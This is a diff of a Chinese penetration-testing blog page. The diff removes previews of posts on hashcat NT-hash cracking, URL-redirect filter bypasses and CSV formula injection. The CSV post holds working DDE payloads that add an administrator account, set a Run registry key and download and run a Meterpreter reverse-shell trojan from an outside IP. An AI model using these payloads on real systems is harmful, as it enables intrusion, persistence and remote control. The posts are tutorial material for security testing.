-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test:1005:aad3b435b51404eeaad3b435b51404ee:f9e37e83b83c47a93c2f09f66408631b:::</span><br><span class="line"></span><br><span class="line">用户名称:RID:LM-HASH值:NT-HASH值</span><br></pre></td></tr></table></figure>
-<p>我们需要提取后方的NT-HASH用来破解，即f9e37e83b83c47a93c2f09f66408631b存入test.txt，由于我设置的是三位字母三位数字的密码，使用如下掩码进行爆破</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1000 -a 3 -o result4.txt test.txt ?l?l?l?d?d?d --force</span><br></pre></td></tr></table></figure>
-<p>可以很快得到结果</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/hashcat/hashcat01.png" alt=""></p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
-<li><a href="https://github.com/hashcat/hashcat" target="_blank" rel="noopener">https://github.com/hashcat/hashcat</a></li>
-<li><a href="https://www.freebuf.com/sectool/164507.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/164507.html</a></li>
-</ul>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/27/url重定向漏洞绕过方式总结/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2020/07/27/url重定向漏洞绕过方式总结/" itemprop="url">
-                  url重定向漏洞绕过方式总结
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-27T21:13:59+08:00">
-                2020-07-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2020/07/27/url重定向漏洞绕过方式总结/" class="leancloud_visitors" data-flag-title="url重定向漏洞绕过方式总结">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="url重定向漏洞"><a href="#url重定向漏洞" class="headerlink" title="url重定向漏洞"></a>url重定向漏洞</h2><p>URL重定向（URL redirection，或称网址重定向或网域名称转址），是指当使用者浏览某个网址时，将他导向到另一个网址的技术。而url重定向漏洞产生的原因是这个网址可控且没有做足够的校验，导致网站接受恶意用户输入的链接，跳转到一个攻击者控制的网站，而攻击者控制的网站往往是一个钓鱼页面，用于骗取用户的个人信息和登录口令。 </p>
-<h2 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h2><p>存在漏洞的url往往都具有以下格式：</p>
-<p><a href="http://www.example.com/xxx?server=http://www.example.com/yyy" target="_blank" rel="noopener">http://www.example.com/xxx?server=http://www.example.com/yyy</a></p>
-<p>后面的url就是其跳转的url，一般由于regist、login、logout这些位置在操作完之后都会有跳转操作，url跳转漏洞也多出现于这类位置。</p>
-<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="检测是否存在信任域名绕过"><a href="#检测是否存在信任域名绕过" class="headerlink" title="检测是否存在信任域名绕过"></a>检测是否存在信任域名绕过</h3><p>由于过滤机制往往只检查后面url是否包含信任域名，所以可构造如下url进行绕过：</p>
-<p><a href="http://www.example.com/xxx?server=http://www.example.com.hack.com/hack.html" target="_blank" rel="noopener">http://www.example.com/xxx?server=http://www.example.com.hack.com/hack.html</a></p>
-<p>hack.com是攻击者网站，攻击者在hack.com中构造<a href="http://www.example.com.hack.com的解析且http://hack.com/hack.html" target="_blank" rel="noopener">www.example.com.hack.com的解析且http://hack.com/hack.html</a> 页面为攻击页面即可。</p>
-<p><a href="http://www.example.com/xxx?server=http://hack.com/www.example.com/" target="_blank" rel="noopener">http://www.example.com/xxx?server=http://hack.com/www.example.com/</a></p>
-<p>hack.com是攻击者网站，攻击者在hack.com中构造<a href="http://hack.com/www.example.com/" target="_blank" rel="noopener">http://hack.com/www.example.com/</a> 页面为攻击页面即可。</p>
-<h3 id="多次重定向绕过"><a href="#多次重定向绕过" class="headerlink" title="多次重定向绕过"></a>多次重定向绕过</h3><p>某些过滤机制可以允许跳转某些信任站点如 baidu.com，如果存在这种情况，可以使用多重跳转来规避过滤机制。</p>
-<p><a href="http://www.example.com/xxx?server=https://www.baidu.com/link?url=fIqZTSHDWy6_CvKi0jDIAa8ZKUKwrwhQlmYecokJ9gy" target="_blank" rel="noopener">http://www.example.com/xxx?server=https://www.baidu.com/link?url=fIqZTSHDWy6_CvKi0jDIAa8ZKUKwrwhQlmYecokJ9gy</a></p>
-<p>link?url= 是百度的默认跳转方式，后面是百度的缓存链接，上面链接的缓存是google页面，此url可通过百度二次跳转到谷歌。</p>
-<h3 id="特殊符号绕过"><a href="#特殊符号绕过" class="headerlink" title="特殊符号绕过"></a>特殊符号绕过</h3><p>以下例子中，<a href="http://www.example.com为可信网站，www.hack.com为恶意网站" target="_blank" rel="noopener">www.example.com为可信网站，www.hack.com为恶意网站</a></p>
-<p>@绕过</p>
-<p><a href="http://www.example.com/xxx?server=http://www.example.com@www.hack.com" target="_blank" rel="noopener">http://www.example.com/xxx?server=http://www.example.com@www.hack.com</a></p>
-<p>/绕过</p>
-<p><a href="http://www.example.com/xxx?server=/www.hack.com" target="_blank" rel="noopener">http://www.example.com/xxx?server=/www.hack.com</a></p>
-<p>//绕过</p>
-<p><a href="http://www.example.com/xxx?server=//www.hack.com" target="_blank" rel="noopener">http://www.example.com/xxx?server=//www.hack.com</a></p>
-<p>////绕过</p>
-<p><a href="http://www.example.com/xxx?server=////www.hack.com" target="_blank" rel="noopener">http://www.example.com/xxx?server=////www.hack.com</a></p>
-<p>\绕过</p>
-<p><a href="http://www.example.com/xxx?server=http://www.hack.com\www.example.com" target="_blank" rel="noopener">http://www.example.com/xxx?server=http://www.hack.com\www.example.com</a></p>
-<p>#绕过</p>
-<p><a href="http://www.example.com/xxx?server=http://www.hack.com#www.example.com" target="_blank" rel="noopener">http://www.example.com/xxx?server=http://www.hack.com#www.example.com</a></p>
-<p>?绕过</p>
-<p><a href="http://www.example.com/xxx?server=http://www.hack.com?www.example.com" target="_blank" rel="noopener">http://www.example.com/xxx?server=http://www.hack.com?www.example.com</a></p>
-<p>.绕过</p>
-<p><a href="http://www.example.com/xxx?server=.hack.com" target="_blank" rel="noopener">http://www.example.com/xxx?server=.hack.com</a></p>
-<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><p>跳转地址白名单化</p>
-<p>如无法使用白名单，要合理校验跳转地址，限制绕过手段</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/16/csv注入利用和绕过总结/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2020/07/16/csv注入利用和绕过总结/" itemprop="url">
-                  csv注入利用和绕过总结
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-16T21:40:03+08:00">
-                2020-07-16
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2020/07/16/csv注入利用和绕过总结/" class="leancloud_visitors" data-flag-title="csv注入利用和绕过总结">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="csv注入"><a href="#csv注入" class="headerlink" title="csv注入"></a>csv注入</h2><p>csv注入是一种将包含恶意命令的excel公式插入到可以导出csv或xls等格式的文本中，当在excel中打开csv文件时，文件会转换为excel格式并提供excel公式的执行功能，会造成命令执行问题。</p>
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞原理就是excel的一个特性，当单元格中内容以=-+@等符号开头时，excel将会将其当成一个公式处理。</p>
-<p>所以当我们输入=1+1时，excel会自动将其计算</p>
-<p>那么利用这个办法，把等号后面的内容改为执行cmd命令控制其打开一个计算器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=1+cmd|&apos; /C calc&apos;!A0</span><br></pre></td></tr></table></figure></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=cmd|&apos;/C reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v calc /t REG_SZ /d c:\windows\system32\calc.exe /f&apos;!A0</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/csv_inject/csv01.png" alt=""></p>
-<h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=cmd|&apos;/C net user test 123456 /add&apos;!A0+</span><br></pre></td></tr></table></figure>
-<p>可以使用命令注入中的知识，同时执行两个命令，达到新建一个管理员用户的效果</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=cmd|&apos;/C net user test 123456 /add &amp;&amp; net localgroup administrators test /add&apos;!A0</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/csv_inject/csv02.png" alt=""></p>
-<h3 id="下载木马，反弹shell"><a href="#下载木马，反弹shell" class="headerlink" title="下载木马，反弹shell"></a>下载木马，反弹shell</h3><p>准备木马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#msf生成payload</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=4444 -f exe -o reverse_tcp.exe</span><br><span class="line">#python2开启http服务</span><br><span class="line">python -m SimpleHTTPServer 8888</span><br><span class="line">#python3开启http服务</span><br><span class="line">python -m http.server 8888</span><br></pre></td></tr></table></figure></p>
-<p>攻击机监听<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST xxx.xxx.xxx.xxx</span><br><span class="line">set LPORT 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
-<p>靶机从python http服务下载木马并执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://170.170.64.17:8888/reverse_tcp.exe --output windowsLocal.exe &amp;&amp; .\windowsLocal.exe</span><br></pre></td></tr></table></figure></p>
-<p>那么我们在csv注入场景下的payload就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=cmd|&apos;/C curl http://170.170.64.17:8888/reverse_tcp.exe --output windowsLocal.exe &amp;&amp; .\windowsLocal.exe&apos;!A0</span><br></pre></td></tr></table></figure></p>
-<p>不过这个方法一般会在下载步骤被windows防火墙拦截，可以自行增加一层编解码或者加解密过程。</p>
-<p>反弹shell也可以通过调用powershell下载powercat反弹，使用nc监听。</p>
-<h2 id="漏洞绕过"><a href="#漏洞绕过" class="headerlink" title="漏洞绕过"></a>漏洞绕过</h2><h3 id="其他运算符号绕过"><a href="#其他运算符号绕过" class="headerlink" title="其他运算符号绕过"></a>其他运算符号绕过</h3><p>很多场景下服务器会过滤=，但是在excel中，+，-，@等也可以触发公式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-cmd|&apos; /C calc&apos;!A0</span><br><span class="line">+cmd|&apos; /C calc&apos;!A0</span><br><span class="line">@SUM(cmd|&apos;/c calc&apos;!A0)</span><br></pre></td></tr></table></figure></p>
-<h3 id="0A绕过自动添加单引号"><a href="#0A绕过自动添加单引号" class="headerlink" title="%0A绕过自动添加单引号"></a>%0A绕过自动添加单引号</h3><p>有些防御手法会在等号之类的运算符前增加’，或每个元素开头直接添加单引号，可使用%0A换行执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0A-1+cmd|&apos; /C calc&apos;!A0</span><br></pre></td></tr></table></figure></p>
-<h3 id="绕过自动添加单引号"><a href="#绕过自动添加单引号" class="headerlink" title=";绕过自动添加单引号"></a>;绕过自动添加单引号</h3><p>有些防御手法会在等号之类的运算符前增加’，或每个元素开头直接添加单引号，可使用;分割，分别执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;-1+cmd|&apos; /C calc&apos;!A0</span><br></pre></td></tr></table></figure></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2356,7 +2348,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">115</span>
+                <span class="site-state-item-count">120</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2378,7 +2370,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">68</span>
+                <span class="site-state-item-count">72</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -2420,7 +2412,7 @@
         <div class="copyright" >
   
   &copy; 
-  <span itemprop="copyrightYear">2020</span>
+  <span itemprop="copyrightYear">2021</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
